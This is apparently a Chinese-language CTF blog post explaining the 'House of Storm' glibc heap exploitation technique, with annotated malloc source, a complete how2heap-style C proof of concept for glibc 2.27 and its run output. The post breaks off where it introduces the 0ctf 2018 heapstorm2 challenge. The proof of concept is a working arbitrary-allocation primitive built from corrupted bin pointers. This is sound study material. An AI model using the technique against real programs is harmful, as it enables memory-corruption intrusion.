<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>house_of_storm | str1k3</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>house_of_storm</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-10-12T23:29:16.000Z" id="date"> 2023-10-12</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-10-23T13:53:40.527Z" id="updated"> 2023-10-23</time></div></span></div></div><hr><div id="post-content"><p><strong>I’m the storm that is approching</strong></p>
<p>从<em><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rookle/p/13140339.html">https://www.cnblogs.com/Rookle/p/13140339.html</a></em>来的关键源码+注释orz</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//#define unsorted_chunks(M)          (bin_at (M, 1))</span><br><span class="hljs-comment">//如果unsorted bins不为空，从尾到头遍历unsorted bin中的每个chunk</span><br><span class="hljs-keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) <br>&#123;<br>    bck = victim-&gt;bk;<span class="hljs-comment">//取出unsorted的尾部的chunk</span><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        检查当前遍历的 chunk 是否合法，chunk 的大小不能小于等于 2 * SIZE_SZ，</span><br><span class="hljs-comment">        也不能超过 该分配区总的内存分配量。然后获取 chunk 的大小并赋值给 size。</span><br><span class="hljs-comment">        这里的检查似乎有点小问题，直接使用了 victim-&gt;size，但 victim-&gt;size </span><br><span class="hljs-comment">        中包含了相关的标志位信息，使用 chunksize(victim) 才比较合理，但在 </span><br><span class="hljs-comment">        unsorted bin 中的空闲 chunk 的所有标志位都清零了，所以这里直接 </span><br><span class="hljs-comment">        victim-&gt;size 没有问题。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect(victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>        || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>        malloc_printerr(check_action, <span class="hljs-string">&quot;malloc(): memory corruption&quot;</span>,<br>                        chunk2mem(victim), av);<br><br>    size = chunksize(victim);<span class="hljs-comment">//获取victim的size</span><br><br>	<span class="hljs-comment">/*</span><br><span class="hljs-comment">        如果要申请的大小在smallbin范围 且 unsorted chunks 只有一个chunk，且</span><br><span class="hljs-comment">        victim是last_remainder 且 victim的size大于请求的chunk的大小nb加上</span><br><span class="hljs-comment">        (MINSIZE)最小chunk的size,那么就切割remainder,然后返回victim。</span><br><span class="hljs-comment">        </span><br><span class="hljs-comment">        last_remainder 是一个 chunk 指针，分配区上次分配 small chunk 时，</span><br><span class="hljs-comment">        从一个 chunk 中分 裂出一个 small chunk 返回给用户，分裂后的剩余部分</span><br><span class="hljs-comment">        形成一个 chunk，last_remainder 就是 指向的这个 chunk。</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(nb) &amp;&amp;<br>        bck == unsorted_chunks(av) &amp;&amp;<br>        victim == av-&gt;last_remainder &amp;&amp;<br>        (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE)) &#123;<br><br>        <span class="hljs-comment">//分割remainder</span><br>        remainder_size = size - nb;<span class="hljs-comment">//计算分割后剩下的size</span><br>        remainder = chunk_at_offset(victim, nb);<span class="hljs-comment">//获取remainder的地址</span><br>        <span class="hljs-comment">//把remainder加入unsorted bin中</span><br>        unsorted_chunks(av)-&gt;bk = unsorted_chunks(av)-&gt;fd = remainder;<br>        av-&gt;last_remainder = remainder; <span class="hljs-comment">// 设置last_remainder为remainder</span><br>        remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks(av);<br>        <span class="hljs-comment">//如果是remainder在large bin的范围，则把fd_nextsize,fd_nextsize清零</span><br>        <span class="hljs-keyword">if</span> (!in_smallbin_range(remainder_size)) &#123;<br>            remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>            remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>		<span class="hljs-comment">//设置victim的size</span><br>        set_head(victim, nb | PREV_INUSE |<br>                 (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>        <span class="hljs-comment">//设置remainder的size</span><br>        set_head(remainder, remainder_size | PREV_INUSE);<br>        <span class="hljs-comment">//设置remainder的物理相邻的下一个chunk的prev_size</span><br>        set_foot(remainder, remainder_size);<br><br>        check_malloced_chunk(av, victim, nb);<span class="hljs-comment">//默认不做任何操作</span><br>        <span class="hljs-type">void</span> *p = chunk2mem(victim);<span class="hljs-comment">//将chunk指针转化为mem指针</span><br>        alloc_perturb(p, bytes);<span class="hljs-comment">//将p的mem部分全部设置为bytes ,默认什么也不做</span><br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br><br>    <span class="hljs-comment">//把victim从unsorted bin 中移除</span><br>    unsorted_chunks(av)-&gt;bk = bck;<br>    bck-&gt;fd = unsorted_chunks(av);<br><br>    <span class="hljs-comment">//如果 victim 的size 与申请的size相等，那么就返回其。</span><br>    <span class="hljs-keyword">if</span> (size == nb) &#123;<br>        <span class="hljs-comment">//设置victim物理相邻的下一个chunk的prev_inuse位</span><br>        set_inuse_bit_at_offset(victim, size);<br>        <span class="hljs-comment">//如果av不是main_arena 也就是说如果不是主进程,设置NON_MAIN_ARENA位</span><br>        <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>            victim-&gt;size |= NON_MAIN_ARENA; <br><br>        check_malloced_chunk(av, victim, nb); <span class="hljs-comment">// 默认不做任何操作</span><br>        <span class="hljs-type">void</span> *p = chunk2mem(victim);<span class="hljs-comment">//把chunk转换为mem指针</span><br>        alloc_perturb(p, bytes);<span class="hljs-comment">//将p的mem部分全部设置为bytes ,默认什么也不做</span><br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br><br>  <br>    <span class="hljs-comment">//如果上一步取出的chunk没有匹配成功，那么将该chunk放入对应的bin中</span><br>    <span class="hljs-comment">//如果在smallbin的范围,则放到对应多small bin中</span><br>    <span class="hljs-keyword">if</span> (in_smallbin_range(size)) <br>    &#123;<br>        victim_index = smallbin_index(size);<span class="hljs-comment">//获取size对应的smallbin的index</span><br>        bck = bin_at(av, victim_index);<span class="hljs-comment">//bck指向size对应的smallbin的链表头</span><br>        <span class="hljs-comment">//fwd指向size对应的smallbin的链表中的新加入的chunk(small bin使用头插法)</span><br>        fwd = bck-&gt;fd;<br>    &#125;<br>    <span class="hljs-keyword">else</span><span class="hljs-comment">//如果不再smallbin的范围，也就是说在large bin 的范围</span><br>    &#123;<br>        victim_index = largebin_index(size);<span class="hljs-comment">//获取size对应的large bin的index</span><br>        bck = bin_at(av, victim_index);<span class="hljs-comment">//bck指向size对应的large bin的链表头</span><br>        fwd = bck-&gt;fd;<span class="hljs-comment">//fwd指向size对应的large bin的链表中的新加入的chunk</span><br>        <br>        <span class="hljs-comment">//如果large bin 非空，在largbin进行按顺序插入</span><br>        <span class="hljs-keyword">if</span> (fwd != bck) &#123;<br>            <span class="hljs-comment">/* Or with inuse bit to speed comparisons */</span><br>            size |= PREV_INUSE;<br>            assert((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<span class="hljs-comment">//默认不启用assert</span><br>            <span class="hljs-comment">/*</span><br><span class="hljs-comment">            	large bin中的chunk是按从大到小排列的，如果size &lt; large bin </span><br><span class="hljs-comment">            	的最后一个chunk，说明size是这个large bin中的最小的，我们把它</span><br><span class="hljs-comment">            	加入到此large bin尾部。</span><br><span class="hljs-comment">            */</span><br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size)) &#123;<br>                <br>                fwd = bck;<br>                bck = bck-&gt;bk;<br>                <br>                <span class="hljs-comment">/*</span><br><span class="hljs-comment">                large bin 中size最小的chunk的fd_nextsize会指向size最大的</span><br><span class="hljs-comment">                那个chunk，也就是首部的chunk。同样，large bin 中size最大的</span><br><span class="hljs-comment">                chunk的bk_nextsize会指向size最小的那个chunk。</span><br><span class="hljs-comment">                victim的bk_nextsize指向large bin原来最小的chunk，它的</span><br><span class="hljs-comment">                bk_nextsize指向最大的那个chunk。那么原来的最小的就成了第二小的了。</span><br><span class="hljs-comment">                把它fd_nextsize和bk_nextsize都修正。</span><br><span class="hljs-comment">                */</span><br>                victim-&gt;fd_nextsize = fwd-&gt;fd;<br>                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<br>                <span class="hljs-comment">//最大size的chunk的bk_nextsize，和原来最小chunk的bk_nextsize都指向victim</span><br>                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>            &#125; <br>            <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果victim不是large bin 中最小的chunk</span><br>            &#123;<br>                assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<span class="hljs-comment">//默认不启用assert</span><br>                <span class="hljs-comment">//从大到小（从头到尾）找到合适的位置</span><br>                <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size) &#123;<br>                    fwd = fwd-&gt;fd_nextsize;<br>                    assert((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                &#125;<br>				<span class="hljs-comment">//如果size刚好相等，就直接加入到其后面省的改fd_nextsize和bk_nextsize了</span><br>                <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                    fwd = fwd-&gt;fd;<br>                <span class="hljs-keyword">else</span> <br>                &#123;<br>                    <span class="hljs-comment">//size不相等，即size&gt;fwd-&gt;size，把victim加入到纵向链表中</span><br>                    victim-&gt;fd_nextsize = fwd;<br>                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                    fwd-&gt;bk_nextsize = victim;<br>                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>                &#125;<br>                bck = fwd-&gt;bk;<br>            &#125;<br>        &#125; <br>        <span class="hljs-keyword">else</span> <span class="hljs-comment">//如果large bin 为空，将victim加入到纵向列表</span><br>        	victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>    &#125;<br><br>    <span class="hljs-comment">//#define mark_bin(m, i)    ((m)-&gt;binmap[idx2block (i)] |= idx2bit (i))</span><br>    mark_bin(av, victim_index); <span class="hljs-comment">//把victim加入到的bin的表示为非空</span><br>    <span class="hljs-comment">//把victim加入到large bin的链表中</span><br>    victim-&gt;bk = bck;<br>    victim-&gt;fd = fwd;<br>    fwd-&gt;bk = victim;<br>    bck-&gt;fd = victim;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>在这里用how2heap里glibc2.27的例子来看实现<br>跟glibc2.23不一样的是，随着tcache机制的加入<br>在2.27打storm需要先把tcachebin填满<br>我删除了大部分的英文<br>但保留了部分<br>这样才知道打的是<em>pwn</em>(doge)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">char</span> filler[<span class="hljs-number">0x60</span>];<br><span class="hljs-type">char</span> target[<span class="hljs-number">0x60</span>]; <br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span>&#123;<br>        setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>        setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// clearenv();</span><br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_shift_amount</span><span class="hljs-params">(<span class="hljs-type">char</span>* pointer)</span>&#123;<br>	<br>	<span class="hljs-type">int</span> shift_amount = <span class="hljs-number">0</span>;<br>	<span class="hljs-type">long</span> <span class="hljs-type">long</span> ptr = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)pointer;	<br>	<br>	<span class="hljs-keyword">while</span>(ptr &gt; <span class="hljs-number">0x20</span>)&#123;<br>		ptr = ptr &gt;&gt; <span class="hljs-number">8</span>; <br>		shift_amount += <span class="hljs-number">1</span>; <br>	&#125;	<br><br>	<span class="hljs-keyword">return</span> shift_amount - <span class="hljs-number">1</span>; <span class="hljs-comment">// Want amount PRIOR to this being zeroed out</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>	init();<br><br>    <span class="hljs-type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;<br>	<span class="hljs-type">int</span>* tcaches[<span class="hljs-number">7</span>];<br><br><br>	unsorted_bin = <span class="hljs-built_in">malloc</span> ( <span class="hljs-number">0x4e8</span> );  <span class="hljs-comment">// size 0x4f0 </span><br><br>	<span class="hljs-comment">// prevent merging </span><br>	<span class="hljs-built_in">malloc</span> ( <span class="hljs-number">0x18</span> ); <br><br>	<span class="hljs-type">int</span> shift_amount = get_shift_amount(unsorted_bin);	<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Shift Amount: %d\n&quot;</span>, shift_amount); <br><br>	<span class="hljs-type">size_t</span> alloc_size = ((<span class="hljs-type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="hljs-number">8</span> * shift_amount);<br>	<span class="hljs-keyword">if</span>(alloc_size &lt; <span class="hljs-number">0x10</span>)&#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Chunk Size: 0x%lx\n&quot;</span>, alloc_size);<br>		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Chunk size is too small&quot;</span>);<br>		<span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>	&#125;<br>	alloc_size = (alloc_size &amp; <span class="hljs-number">0xFFFFFFFFE</span>) - <span class="hljs-number">0x10</span>; <span class="hljs-comment">// Remove the size bits</span><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;In this case, the chunk size is 0x%lx\n&quot;</span>, alloc_size);<br><br>        <span class="hljs-comment">// Checks to see if the program will crash or not</span><br><br>        <span class="hljs-keyword">if</span>((alloc_size &amp; <span class="hljs-number">0x8</span>) != <span class="hljs-number">0</span> || (((alloc_size &amp; <span class="hljs-number">0x4</span>) == <span class="hljs-number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="hljs-number">0x2</span>) != <span class="hljs-number">0x2</span>)))&#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Please try again! :)&quot;</span>);<br>                <br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<span class="hljs-comment">//这里crash好多次 :(</span><br><br>	<span class="hljs-keyword">if</span>(alloc_size &lt; <span class="hljs-number">0x410</span>)&#123;<br>		<span class="hljs-comment">// Fill up the TCache for the proper size</span><br>		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++)&#123;<br>			tcaches[i] = <span class="hljs-built_in">malloc</span>(alloc_size);<br>		&#125;<br>		<span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++)&#123;<br>			<span class="hljs-built_in">free</span>(tcaches[i]);<br>		&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span>&#123;<br>		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Not filling up the TCache&quot;</span>);<br>	&#125;<br><br>	large_bin  =  <span class="hljs-built_in">malloc</span> ( <span class="hljs-number">0x4d8</span> );  <span class="hljs-comment">// size 0x4e0 </span><br>	<span class="hljs-comment">// prevent merging </span><br>	<span class="hljs-built_in">malloc</span> ( <span class="hljs-number">0x18</span> );<br><br>	<span class="hljs-comment">// FIFO </span><br>	<span class="hljs-built_in">free</span> ( large_bin );  <span class="hljs-comment">// put small chunks first </span><br>	<span class="hljs-built_in">free</span> ( unsorted_bin );<br><br>	<span class="hljs-comment">// Put the &#x27;large bin&#x27; chunk into the large bin</span><br>	unsorted_bin = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x4e8</span>);<br>	<span class="hljs-built_in">free</span>(unsorted_bin);<br><br>	<span class="hljs-comment">// The address that we want to write to!</span><br>	fake_chunk = target - <span class="hljs-number">0x10</span>;<br><br>	<br>	((<span class="hljs-type">size_t</span> *)unsorted_bin)[<span class="hljs-number">1</span>] = (<span class="hljs-type">size_t</span>)fake_chunk; <span class="hljs-comment">// unsorted_bin-&gt;bk</span><br><br>	<span class="hljs-comment">// Only needs to be a valid address. </span><br>	(( <span class="hljs-type">size_t</span> *) large_bin )[<span class="hljs-number">1</span>]  =  (<span class="hljs-type">size_t</span>)fake_chunk  +  <span class="hljs-number">8</span> ;  <span class="hljs-comment">// large_bin-&gt;fd</span><br><br>	(( <span class="hljs-type">size_t</span> *) large_bin)[<span class="hljs-number">3</span>] = (<span class="hljs-type">size_t</span>)fake_chunk - <span class="hljs-number">0x18</span> - shift_amount; <span class="hljs-comment">// large_bin-&gt;bk_nextsize</span><br><br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String before: %s\n&quot;</span>, target);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String pointer: %p\n&quot;</span>, target);<br><br>	ptr = <span class="hljs-built_in">calloc</span>(alloc_size, <span class="hljs-number">1</span>);<br>	<span class="hljs-built_in">strncpy</span>(ptr, <span class="hljs-string">&quot;\x41\x42\x43\x44\x45\x46\x47&quot;</span>, <span class="hljs-number">0x58</span> - <span class="hljs-number">1</span>);<br>	<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;String after %s\n&quot;</span>, target);<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Fake chunk ptr: %p\n&quot;</span>, ptr);<br><br>	<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>不知道为什么在gdb里一直crash，但是直接运行可以成功 <em>:)</em><br>没法调试<br>放个完整的运行结果</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs text">House of Storm<br>======================================<br>Preparing chunks for the exploit<br>Put one chunk into unsorted bin and the other into the large bin<br>The unsorted bin chunk MUST be larger than the large bin chunk.<br>Find the proper chunk size to allocate.<br>Must be exactly the size of the written chunk from above.<br>Shift Amount: 5<br>In this case, the chunk size is 0x46<br>Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)<br>Done to prevent usage of TCache stashing<br>Vulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location.<br> This is our target location to get from the allocator<br>Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location<br>of your fake chunk.<br>Misalign the location in order to use the primitive as a SIZE value.<br>The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).<br>Vulnerability #2!<br>Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.<br>Make allocation of the size that the value will be written for.<br>Once the allocation happens, the madness begins<br>Once in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to <br>write a fake &#x27;size&#x27; value to the location of our target.<br>After this, the target will have a valid size.<br>Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid<br>size and remove it from the bin.<br>With this, we have pulled out an arbitrary chunk!<br>String before: <br>String pointer: 0x56053bf12040<br>Make a call to &#x27;calloc&#x27; instead of &#x27;malloc&#x27; in order to <br>not use the TCache on the allocation. Had to fill TCache<br>because stashing would prevent the exploit from working<br>String after ABCDEFG<br>Fake chunk ptr: 0x56053bf12040<br></code></pre></td></tr></table></figure>

<p>来看道例题吧<br><em>据说就是该攻击手法的来源</em><br><strong>0ctf_2018_heapstorm2</strong><br>glibc2.23<br>checksec</p>
